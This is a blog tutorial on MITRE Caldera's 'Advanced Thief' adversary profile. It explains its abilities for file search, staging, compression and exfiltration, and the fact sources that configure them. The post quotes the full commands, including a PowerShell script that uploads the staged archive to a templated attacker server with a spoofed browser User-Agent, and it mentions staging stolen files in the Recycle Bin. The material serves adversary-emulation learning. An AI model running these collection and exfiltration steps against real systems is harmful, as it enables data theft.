---
title: Caldera Fact Sources by Theift
draft: false
authors:
  - admin
date: 2024-05-02
tags:
  - Caldera
  - Theif
  - Fact Sources 
  - Exfil
---

Were going to walk throught the Advanced Theif adversary and understand whats going on. We'll start first with Abilities, setup Fact Sources last and disect commands in the middle. 
This adversary is simple and has only a few abilities to configure setup.  

## Theif

This adversary searches for files, compress them and exfiltrate to the attackers server.  

## Abilities

### 1. Advanced File Search and Stager
- **Tactic**:                    Collection
- **Technique ID**:        [T1119](https://attack.mitre.org/techniques/T1119/)
- **Technique Name**: Automation Collection
- **Payload**: [file_search.ps1](https://github.com/mitre/stockpile/blob/bac8177b6146bbe0f760e973428710d77e0081f2/payloads/file_search.ps1) [file_search.sh](https://github.com/mitre/stockpile/blob/bac8177b6146bbe0f760e973428710d77e0081f2/payloads/file_search.sh)

The payload is really well written. Clean and easy to ready. Something you could use to learn PowerShell with. 

This script essentially searches the box for files of interest or a specific file. Then places them in a staging location. 

**Command**

```shell
.\file_search.ps1 -Extensions '#{windows.included.extensions}' -ExcludedExtensions '#{windows.excluded.extensions}'
 -Directories '#{windows.included.directories}' -ExcludedDirectories '#{windows.excluded.directories}'
 -AccessedCutoff #{file.last.accessed} -ModifiedCutoff #{file.last.modified}
 -SearchStrings '#{file.sensitive.content}' -StagingDirectory '#{windows.staging.location}'
 -SafeMode $#{safe.mode.enabled} -PseudoExtension #{pseudo.data.identifier}
```


- In the command its passing several fact sources to the payload. 
- the use of `-Extensions` sets file extensions and directories to include and exclude with `-Excluded Extenstions`.
- Its specifies what extensions and directories to exclude with `-Directories`, ` -ExcludedDirectories`. This is going to speed up the search on the box by narrowing the scope.
- The access cutoff will be in days. Its looking back 30 days for files a user has accessed or modified with `-AccessedCutoff`
- With `-SearchStings` the fact passes a list of key word to look for.
- It sets the staging directory with `-StagingDirectory`. The location where all the files will be dumped before compressing
- `-SafeMode` is an interesting switch paired with `-PseudoExtension`. In the payload you see `[bool] $SafeMode = $False,` and a fact source. This a Boolean with the default being False. Safemode is the switch to use  `-PseudoExtension`or not and represents the basename of the file.  So if set to True and you passed the file special.txt. That would be the only file return once the payload is efiltrated. Example being Report.pdf this would be `Report`.  If `-SafeMode` is set to True it will use `-PseudoExtension` and make sure the file matches this.


### 2. Compress Staged Directory
- **Tactic**: Exfiltration
- **Technique ID**: [T1560.001](https://attack.mitre.org/techniques/T1560/001/)
- **Technique Name**: Archive Collected Data: Archive via Utility 

```shell
Compress-Archive -Path #{host.dir.staged} -DestinationPath #{host.dir.staged}.zip -Force;
sleep 1; ls #{host.dir.staged}.zip | foreach {$_.FullName} | select
```

- Compress-Archive takes the path of our the staging directory. That being the Recycle Bin. 
- Destination Path is where you're putting the files. Looks like its the same location. Its will create a .zip of the files.
- With `-Force` set it overrides any existing files with the same name
- In Caldera you can see the response of the command. So we see the `;` adding another command sleeping for 1 second. Followed by a ls -Piped-> into a foreach loop on the output of ls.  Unsure why this is needed.

### 3. Exfil Staged Directory
- **Tactic**: Exfiltration
- **Technique ID**: [T1041](https://attack.mitre.org/techniques/T1041/)
- **Technique Name**: Exfiltration Over C2 Channel


Finally into the final stage of the adversary where the data is exfiltrated.  


```python
# Set variables
$ErrorActionPreference = 'Stop';
$fieldName = "#{host.dir.compress}";
$filePath = "#{host.dir.compress}";
$url = "#{server}/file/upload";

Add-Type -AssemblyName 'System.Net.Http';

$client = New-Object System.Net.Http.HttpClient;
$content = New-Object System.Net.Http.MultipartFormDataContent;
$fileStream = [System.IO.File]::OpenRead($filePath);
$fileName = [System.IO.Path]::GetFileName($filePath);
$fileContent = New-Object System.Net.Http.StreamContent($fileStream);
$content.Add($fileContent, $fieldName, $fileName);
$client.DefaultRequestHeaders.Add("X-Request-Id", $env:COMPUTERNAME + '-#{paw}');
$client.DefaultRequestHeaders.Add("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36");

$result = $client.PostAsync($url, $content).Result;
$result.EnsureSuccessStatusCode();
```

This is what a http request looks like in powershell. They build the HTTP client set the file and adds a user agent. Lastly we package it up and ship it back.


- Right in the beginning we set variables and use the Fact Source details. 
- Next we call to .Net System.Net.Http library and load it. 
- Then the assembly of the client is performed and building of the request. Like setting the User-Agent and attaching the payload.


https://learn.microsoft.com/en-us/dotnet/api/system.net.http?view=net-8.0

https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/add-type?view=powershell-7.4


## Fact Sources

Now that we've covered the Abilities lets focus on Fact Sources. They are a little confusing at first. Fact Sources are just configuration settings for your Adversaries abilities. Abilities can tap into templating to set template variable from facts. 

Facts are a collection of key/values that are used to pass into an Operation. As the Operation executes it populates the templated text in a command or ability with the Fact Sources value. Like a the shapes box when we were younger. Its possible to run an Adversary in an Operation without the correct fact sources.

Continuing on, below are the Fact Sources needed with a description of what role they play in the Abilities.

| Fact Source                  | Description                                                                  |
| ---------------------------- | ---------------------------------------------------------------------------- |
| windows.included.extensions  | File extensions that should not be ignored                                   |
| windows.excluded.extensions  | File extensions to ignore                                                    |
| windows.included.directories | Base Directory to crawl                                                      |
| windows.excluded.directories | What directories are out of scope                                            |
| file.last.accessed           | Time Frame -30 Days                                                          |
| file.last.modified           | Time Frame -30 Days                                                          |
| file.sensitive.content       | Its a list of possible keywords used to identify sensitive content           |
| windows.staging.location     | Location to stage the compression. Its set to Recycle bin... kind of cleaver |
| pseudo.data.identifier       | specific file name                                                           |

### File Compression

| Fact Source     | Description                                      |
| --------------- | ------------------------------------------------ |
| host.dir.staged | Location the files will be stored and compressed |

### Exfil

| Fact Source       | Description                                  |
| ----------------- | -------------------------------------------- |
| host.dir.compress | where to save the compress the file          |
| paw               | Paw print, this is the identity of the agent |
| server            | Target Exfil Server                          |

### Prebuilt Fact Sources

The Fact Source entries form above are included in the **Exfil Operation** collection of facts. 
We are missing a few of the facts that are required. 

#### Missing Fact 
| Fact Source       | Description                                  |
| ----------------- | -------------------------------------------- |
| host.dir.staged   | Loation where the files where staged         | 
| host.dir.compress | where to save the compress the file          |
| paw               | Paw print, this is the identity of the agent |
| server            | Target Exfil Server                          |


